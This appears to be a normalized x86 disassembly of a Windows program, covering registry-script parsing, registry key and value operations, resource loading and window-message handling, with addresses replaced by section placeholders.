jl r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
push r--data
push esi
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x2280 ] 0x1
movzx ecx [ esi ]
mov eax esi
cmp cx bx
je r-xdata
push r--data
push esi
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax esi
mov [ esp + 0x20 ] ebx
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
mov edi r--data
cmp cx 0x5c
je r-xdata
movzx ecx [ esi ]
mov eax esi
cmp cx bx
je r-xdata
mov edi [ esp + 0x10 ]
lea eax [ esp + 0x26c ]
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
cmp [ esp + 0x24 ] ebx
je r-xdata
add edi 0x4
cmp edi r--data
jl r-xdata
cmp eax ebx
jne r-xdata
push eax
call [ CharNextW@IAT ]
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
lea ecx [ ecx ]
mov edi [ esp + 0x10 ]
mov eax esi
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
mov [ esp + 0x2280 ] bl
mov [ esp + 0x30 ] ebx
mov edi [ esp + 0x10 ]
mov eax esi
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
mov eax [ edi ]
push eax
push esi
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ esp + 0x2c ] ecx
push esi
lea ecx [ esp + 0x30 ]
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
call sub_410cd0
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x2280 ] bl
lea esi [ esp + 0x2c ]
call sub_410f20
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov [ esp + 0x20 ] ebx
cmp [ esp + 0x1c ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
push eax
call [ CharNextW@IAT ]
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
cmp [ esi ] 0x3d
jne r-xdata
mov [ esp + 0x2280 ] bl
lea esi [ esp + 0x2c ]
call sub_410f20
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov ebx esi
call sub_410b50
mov edi eax
xor eax eax
cmp edi eax
jl r-xdata
mov ecx [ esp + 0x2278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x2260 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x10
mov [ esp + 0x24 ] 0x2
jmp r-xdata
mov [ esp + 0x24 ] ebx
cmp [ esp + 0x1c ] ebx
je r-xdata
mov eax [ esp + 0x28 ]
lea edx [ esp + 0x20 ]
push edx
push 0x2001f
push ebx
push esi
push eax
call [ RegOpenKeyExW@IAT ]
mov ecx [ esp + 0x28 ]
push esi
mov esi [ esp + 0x20 ]
push ecx
lea edi [ esp + 0x28 ]
mov ebx 0x2001f
call sub_410bf0
mov esi [ esp + 0x38 ]
xor ebx ebx
jmp r-xdata
mov [ esp + 0x2280 ] 0xffffffff
lea esi [ esp + 0x14 ]
call sub_410f20
mov eax 0x80020009
jmp r-xdata
cmp cx 0x5c
je r-xdata
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov [ esp + 0x2280 ] al
lea esi [ esp + 0x2c ]
mov [ esp + 0x2280 ] al
mov [ esp + 0x30 ] eax
xor ebx ebx
mov [ ebp + 0x14 ] 0x1
mov edx [ esp + 0x28 ]
lea ecx [ esp + 0x24 ]
push ecx
push 0x20019
push ebx
push esi
push edx
call [ RegOpenKeyExW@IAT ]
mov eax [ esp + 0x28 ]
push esi
mov esi [ esp + 0x20 ]
push eax
lea edi [ esp + 0x2c ]
mov ebx 0x20019
call sub_410bf0
mov esi [ esp + 0x38 ]
xor ebx ebx
jmp r-xdata
mov [ esp + 0x20 ] ebx
cmp [ esp + 0x1c ] ebx
je r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x2280 ] 0x2
mov edx [ esp + 0x28 ]
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x48 ]
push eax
mov [ esp + 0x4c ] edx
push ecx
mov edx esi
lea ecx [ esp + 0x274 ]
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] ebx
call sub_4105e0
mov edi eax
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
cmp edi ebx
jl r-xdata
cmp [ esi ] 0x7d
jne r-xdata
push esi
call [ lstrlenW@IAT ]
cmp eax 0x1
jne r-xdata
push 0x80004005
call sub_402d00
movzx eax [ eax + lookup_table_411a44 ]
jmp [ eax * 4 + jump_table_411a34 ]
mov [ esp + 0x24 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0x20 ]
push eax
push 0x20019
push ebx
push esi
push ecx
call [ RegOpenKeyExW@IAT ]
mov edx [ esp + 0x28 ]
push esi
mov esi [ esp + 0x20 ]
push edx
lea edi [ esp + 0x28 ]
mov ebx 0x20019
call sub_410bf0
mov esi [ esp + 0x38 ]
xor ebx ebx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebx
cmp eax ebx
je r-xdata
push ecx
call [ RegCloseKey@IAT ]
mov [ esp + 0x14 ] ebx
mov ecx [ esp + 0x10 ]
mov ebx esi
call sub_410b50
mov edi eax
xor ebx ebx
test edi edi
js r-xdata
cmp [ esp + 0x20 ] ebx
je r-xdata
mov [ esp + 0x2280 ] bl
lea esi [ esp + 0x48 ]
call sub_410f20
mov [ esp + 0x2280 ] bl
mov [ esp + 0x4c ] ebx
jmp r-xdata
push r--data
push esi
mov [ esp + 0x28 ] 0x1
call [ lstrcmpiW@IAT ]
neg eax
sbb edi edi
push r--data
inc edi
push esi
mov [ esp + 0x2c ] edi
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ esp + 0x14 ]
push ebx
push eax
push ecx
mov ecx [ esp + 0x1c ]
push esi
call sub_4111e0
mov edi eax
cmp edi ebx
jl r-xdata
mov edi [ esp + 0x10 ]
mov eax esi
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
push 0x8007000e
call sub_402d00
push 0x80070057
call sub_402d00
push 0xffffffff
push esi
lea edx [ esp + 0x6c ]
push 0x104
push edx
call [ wcsncpy_s@IAT ]
add esp 0x10
cmp eax 0x50
ja r-xdata
mov ecx [ esp + 0x24 ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] ebx
push ecx
call [ RegCloseKey@IAT ]
mov [ esp + 0x14 ] ebx
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_410400
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x14 ]
xor eax eax
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax esi
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
jmp r-xdata
mov [ esp + 0x58 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x2280 ] 0x3
mov ecx [ esp + 0x28 ]
lea edx [ esp + 0x58 ]
push edx
mov edx 0x20006
xor eax eax
call sub_410c60
cmp eax ebx
jne r-xdata
cmp [ esi ] 0x7b
jne r-xdata
mov edi [ esp + 0x10 ]
mov eax esi
call sub_411030
mov edi eax
cmp edi ebx
jl r-xdata
mov ecx [ esp + 0x10 ]
mov ebx esi
call sub_410b50
mov edi eax
test edi edi
js r-xdata
call sub_410ff0
mov edi eax
jmp r-xdata
mov edx [ esp + 0x20 ]
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ebx
cmp eax ebx
je r-xdata
push ecx
call [ RegCloseKey@IAT ]
mov [ esp + 0x14 ] ebx
cmp [ esi ] 0x3d
jne r-xdata
call sub_410ff0
mov edi eax
mov [ esp + 0x2280 ] bl
lea esi [ esp + 0x58 ]
call sub_410f20
jmp r-xdata
mov edi [ esp + 0x58 ]
lea eax [ esp + 0x26c ]
push eax
push edi
call [ RegDeleteValueW@IAT ]
cmp eax ebx
je r-xdata
jmp r-xdata
xor ebx ebx
cmp [ esi ] 0x7b
jne r-xdata
mov [ esp + 0x2280 ] 0xffffffff
lea esi [ esp + 0x14 ]
call sub_410f20
mov eax edi
jmp r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov edx esi
xor ecx ecx
call sub_4105e0
mov edi eax
cmp edi ebx
jl r-xdata
mov [ esp + 0x2280 ] bl
cmp edi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ esp + 0x24 ] 0x2
mov eax [ esp + 0x54 ]
mov [ ebp + 0x14 ] eax
je r-xdata
push esi
call [ lstrlenW@IAT ]
cmp eax 0x1
jne r-xdata
jmp r-xdata
mov [ esp + 0x5c ] ebx
push edi
call [ RegCloseKey@IAT ]
mov [ esp + 0x58 ] ebx
xor ebx ebx
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ esp + 0x14 ]
mov ebx [ esp + 0x10 ]
push ecx
push 0x0
push edx
push esi
mov ecx ebx
call sub_4111e0
mov edi eax
test edi edi
jns r-xdata
cmp [ esp + 0x54 ] 0x0
mov ebx [ esp + 0x14 ]
je r-xdata
cmp [ esp + 0x54 ] 0x0
je r-xdata
mov eax esi
mov edi ebx
call sub_411030
mov edi eax
test edi edi
js r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx ebx
call sub_410ed0
mov [ esp + 0x24 ] eax
xor eax eax
test ebx ebx
je r-xdata
mov ecx ebx
call sub_410ed0
test eax eax
je r-xdata
call sub_410ff0
mov edi eax
jmp r-xdata
mov [ esp + 0x18 ] 0x0
test eax eax
jne r-xdata
push ebx
call [ RegCloseKey@IAT ]
mov [ esp + 0x14 ] 0x0
lea ebx [ esp + 0x64 ]
call sub_410bb0
test eax eax
je r-xdata
cmp [ esp + 0x20 ] eax
je r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
cmp [ esp + 0x24 ] eax
jne r-xdata
mov ecx ebx
push ecx
lea ecx [ esp + 0x18 ]
call sub_410cd0
jmp r-xdata
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x2280 ] 0x4
mov edx [ esp + 0x28 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
lea ebx [ esp + 0x64 ]
lea eax [ esp + 0x3c ]
mov [ esp + 0x3c ] edx
call sub_410f40
xor ebx ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
cmp eax ebx
jne r-xdata
call sub_410ff0
mov edi eax
mov [ esp + 0x2280 ] bl
lea esi [ esp + 0x3c ]
jmp r-xdata
mov [ esp + 0x2280 ] bl
lea esi [ esp + 0x3c ]
call sub_410f20
mov esi [ esp + 0x38 ]
jmp r-xdata
call sub_410f20
sub_411a48
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_411aa0
push edi
mov edi [ CharNextW@IAT ]
pop edi
retn
movzx ecx [ ecx + lookup_table_411ad4 ]
jmp [ ecx * 4 + jump_table_411acc ]
push eax
call edi
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
movzx ecx [ eax ]
add ecx 0xfffffff7
cmp ecx 0x17
ja r-xdata
sub_411af0
push ebp
mov ebp esp
mov eax 0x200c
call sub_444aa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
lea eax [ ebp - 0x2008 ]
push eax
mov edi ecx
mov [ ebp - 0x2008 ] 0x0
call sub_410050
mov esi eax
test esi esi
js r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x2008 ]
xor ecx ecx
mov [ edi ] eax
cmp cx [ eax ]
je r-xdata
mov ecx [ ebp - 0x2008 ]
push ecx
call [ CoTaskMemFree@IAT ]
mov eax esi
push ebx
nop
pop ebx
xor esi esi
jmp r-xdata
mov edx [ esi * 8 + r--data ]
push edx
lea eax [ ebp - 0x2004 ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov ebx [ esi * 8 + r--data ]
test ebx ebx
je r-xdata
inc esi
cmp esi 0xe
jb r-xdata
mov esi 0x80020009
jmp r-xdata
lea eax [ ebp - 0x2004 ]
call sub_411030
mov esi eax
test esi esi
js r-xdata
mov ecx 0x7b
cmp cx [ ebp - 0x2004 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x0
test eax eax
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2004 ]
push ecx
mov ecx edi
call sub_4111e0
mov esi eax
test esi esi
js r-xdata
mov edx [ edi ]
push eax
push ebx
lea eax [ ebp - 0x2004 ]
push eax
mov ecx edi
mov [ ebp - 0x200c ] edx
call sub_4111e0
mov esi eax
test esi esi
jns r-xdata
jmp r-xdata
mov eax [ edi ]
movzx ecx [ eax ]
add ecx 0xfffffff7
cmp ecx 0x17
ja r-xdata
mov edx [ ebp - 0x200c ]
push 0x0
push 0x0
push ebx
lea eax [ ebp - 0x2004 ]
push eax
mov ecx edi
mov [ edi ] edx
call sub_4111e0
xor ecx ecx
cmp cx [ eax ]
jne r-xdata
movzx edx [ ecx + lookup_table_411c6c ]
jmp [ edx * 4 + jump_table_411c64 ]
lea eax [ ebp - 0x2004 ]
call sub_411030
mov esi eax
test esi esi
js r-xdata
jmp r-xdata
push eax
call [ CharNextW@IAT ]
mov [ edi ] eax
jmp r-xdata
sub_411c90
push ebp
mov ebp esp
push 0xffffffff
push sub_44a376
mov eax [ fs : 0x0 ]
push eax
sub esp 0x42c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
mov edi ecx
mov ebx [ ebp + 0xc ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x428 ] edx
mov [ ebp - 0x42c ] ecx
mov [ ebp - 0x418 ] ecx
mov [ ebp - 0x4 ] 0x1
push 0x2
push ecx
push eax
call [ LoadLibraryExW@IAT ]
mov esi eax
mov [ ebp - 0x420 ] esi
test esi esi
jne r-xdata
push ebx
push edi
push esi
call [ FindResourceW@IAT ]
mov edi eax
test edi edi
jne r-xdata
call sub_409b60
mov edi eax
jmp r-xdata
push edi
push esi
call [ LoadResource@IAT ]
mov ebx eax
mov [ ebp - 0x424 ] ebx
test ebx ebx
jne r-xdata
call sub_409b60
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x414 ]
cmp [ ebp - 0x418 ] ecx
je r-xdata
push edi
push esi
call [ SizeofResource@IAT ]
mov edi eax
mov [ ebp - 0x41c ] edi
lea eax [ edi + 0x1 ]
cmp eax edi
jae r-xdata
call sub_409b60
jmp r-xdata
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
lea eax [ ebp - 0x418 ]
call sub_410570
mov [ ebp - 0x4 ] 0x2
xor ecx ecx
shld ecx eax 0x1
mov [ ebp - 0x434 ] ecx
add eax eax
mov [ ebp - 0x438 ] eax
test ecx ecx
jne r-xdata
mov edi 0x8007000e
jmp r-xdata
push 0x80070216
call sub_402d00
cmp eax 0xffffffff
jbe r-xdata
push esi
call [ FreeLibrary@IAT ]
cmp eax 0x400
jbe r-xdata
lea edx [ ebp - 0x414 ]
mov [ ebp - 0x418 ] edx
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
lea ecx [ ebp - 0x418 ]
push ecx
call sub_40fe40
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x418 ]
test eax eax
jne r-xdata
push edi
push eax
push edi
push ebx
push 0x0
push 0x3
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi 0x8007000e
jmp r-xdata
xor ecx ecx
mov edx [ ebp - 0x418 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp - 0x418 ]
lea ecx [ ebp - 0x42c ]
call sub_411af0
call sub_409b60
jmp r-xdata
sub_411e80
push ebp
mov ebp esp
push 0xffffffff
push sub_44a3a8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
push eax
mov eax [ ebp + 0x8 ]
push r--data
push eax
call sub_411c90
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_411f00
push ebp
mov ebp esp
push 0xffffffff
push sub_44af59
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov ebx ecx
lea ecx [ ebp - 0xa54 ]
mov [ ebp - 0xa5c ] eax
mov esi edx
mov [ ebp - 0xa58 ] r--data
mov [ ebp - 0xa44 ] ecx
mov [ ebp - 0xa54 ] edi
mov [ ebp - 0xa50 ] edi
mov [ ebp - 0xa4c ] edi
mov [ ebp - 0x4 ] 0x2
cmp esi edi
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
lea ecx [ ebp - 0xa58 ]
push ecx
mov ecx ebx
call edx
mov esi eax
cmp esi edi
jge r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
mov [ ebp - 0xa44 ] edi
mov [ ebp - 0x4 ] 0x4
mov esi [ rw-data ]
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push esi
call [ GetModuleFileNameW@IAT ]
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax esi
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp eax edi
je r-xdata
cmp eax 0x104
jne r-xdata
call sub_409b60
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x8 ]
add esi 0x8
cmp eax edi
jne r-xdata
cmp ecx edi
je r-xdata
lea eax [ ebp - 0x218 ]
mov edx 0x208
lea ecx [ ebp - 0xa40 ]
call sub_40fa50
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax 0x8007007a
jmp r-xdata
mov edi eax
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax edi
mov [ ebp - 0xa44 ] edi
mov [ ebp - 0x4 ] 0x3
push ecx
push eax
lea edx [ ebp - 0xa54 ]
push edx
call sub_40fb80
mov [ ebp - 0x4 ] 0x2
lea ecx [ ecx ]
lea ecx [ ebp - 0x62e ]
mov eax 0x22
push 0x20b
push ecx
lea esi [ ebp - 0xa40 ]
mov [ ebp - 0x630 ] ax
call sub_408690
add esp 0x8
test al al
jne r-xdata
push edi
call [ GetModuleHandleW@IAT ]
cmp esi eax
je r-xdata
lea edx [ ebp - 0x630 ]
push edx
call [ lstrlenW@IAT ]
mov ecx 0x22
xor edx edx
mov [ ebp + eax * 2 - 0x630 ] cx
mov [ ebp + eax * 2 - 0x62e ] dx
lea eax [ ebp - 0x630 ]
push eax
push r--data
lea ecx [ ebp - 0xa58 ]
push ecx
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax 0x80004005
jmp r-xdata
lea ecx [ ebp - 0xa40 ]
push ecx
push r--data
lea edx [ ebp - 0xa58 ]
push edx
jmp r-xdata
lea edx [ ebp - 0xa40 ]
push edx
push r--data
lea eax [ ebp - 0xa58 ]
push eax
call sub_40fd30
mov ebx eax
cmp ebx edi
jl r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax ebx
jmp r-xdata
call sub_40fd30
mov ebx eax
cmp ebx edi
jge r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
mov ecx [ ebp - 0xa5c ]
lea edx [ ebp - 0x218 ]
push edx
lea edx [ ebp - 0xa58 ]
call sub_411e80
lea ecx [ ebp - 0x218 ]
push ecx
mov ecx [ ebp - 0xa5c ]
lea edx [ ebp - 0xa58 ]
call sub_40fdc0
jmp r-xdata
sub_4121f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44946e
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_414600
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x2b4 ] r--data
mov [ esi + 0x2b8 ] r--data
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x2b4 ] r--data
mov [ esi + 0x2b8 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ esi + 0x2c0 ]
mov ecx rw-data
mov [ ebp - 0x10 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x2
push r--data
mov [ esi + 0xc ] 0x6
call [ RegisterWindowMessageW@IAT ]
mov [ esi + 0x2bc ] eax
mov [ esi + 0x2c4 ] edi
mov [ esi + 0x2cc ] edi
mov [ esi + 0x2c8 ] edi
mov [ esi + 0x298 ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4122f0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_412320
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_412320
push ebp
mov ebp esp
push 0xffffffff
push sub_44942e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x2b4 ] r--data
mov [ esi + 0x2b8 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x2c0 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_4147c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4123f0
push esi
mov esi ecx
lea eax [ esi - 0x13c ]
push eax
call sub_412c20
mov ecx [ esi - 0x1a8 ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
pop esi
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ esi - 0x1a8 ] 0x0
sub_412430
cmp [ ecx - 0x28f ] 0x0
je r-xdata
xor eax eax
retn
mov eax [ ecx - 0x2b4 ]
test eax eax
je r-xdata
cmp [ eax + 0x19 ] 0x0
je r-xdata
cmp [ ecx + 0xc ] 0x0
jne r-xdata
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov eax [ ecx - 0x2b8 ]
mov edx [ eax + 0x120 ]
mov [ ecx + 0xc ] 0x1
add ecx 0xfffffd48
call edx
sub_4124b0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_42bc20
cmp [ esi + 0x18 ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0x38 ]
push edi
call edx
sub_4124e0
push esi
mov esi ecx
lea eax [ esi + 0x70 ]
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x29 ] 0x0
call sub_412ec0
mov ecx [ esi + 0x18 ]
pop esi
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
jmp edx
sub_412510
push ebx
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x1c ]
push edi
call edx
mov edi [ esi + 0x78 ]
sub edi [ esi + 0x74 ]
xor ebx ebx
sar edi 0x2
test edi edi
jle r-xdata
cmp [ esi + 0x18 ] 0x0
pop edi
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
pop esi
pop ebx
jmp eax
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
call eax
sub_412580
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
cmp edi 0x18
jne r-xdata
cmp edi 0x113
jne r-xdata
mov eax 0x1
cmp ebx eax
jne r-xdata
cmp edi [ esi + 0x2bc ]
jne r-xdata
mov eax [ esi + 0x2cc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push eax
push ebx
push edi
push ecx
mov ecx esi
call sub_415dc0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov [ esi + 0x2c8 ] eax
mov eax ebx
lea ecx [ eax - 0x1 ]
cmp ecx 0x4
ja r-xdata
push eax
mov eax [ esi + 0x1b0 ]
push eax
call [ KillTimer@IAT ]
mov ecx [ esi + 0x2bc ]
mov edx [ esi + 0x1b0 ]
push 0x0
mov eax 0x1
push eax
push ecx
push edx
mov [ esi + 0x2cc ] 0x0
mov [ esi + 0x21c ] eax
call [ PostMessageW@IAT ]
jmp r-xdata
mov eax 0x1
